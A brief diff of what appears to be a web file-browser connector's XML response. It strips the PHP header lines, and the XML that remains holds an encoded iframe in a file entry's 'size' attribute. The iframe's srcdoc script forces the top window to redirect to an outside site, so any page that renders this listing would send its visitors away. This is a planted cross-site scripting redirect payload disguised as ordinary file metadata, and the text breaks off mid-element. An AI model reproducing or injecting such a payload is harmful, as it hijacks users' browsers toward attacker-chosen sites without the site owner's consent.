@@ -1,9 +1,3 @@
-<?php
-header('Content-Type: application/xml; charset=UTF-8');
-header('Access-Control-Allow-Origin: *');
-header('X-Content-Type-Options: nosniff');
-?>
-
 <Connector resourceType="Document"><CurrentFolder path="/1 - f/" url=""/><Files><File desc="1" name="Loading..."
 size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot;
 srcdoc=&quot;&amp;lt;script&amp;gt;window.top.location.href='https://sportsivo.com/video/posts/930674851126575';&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;" 
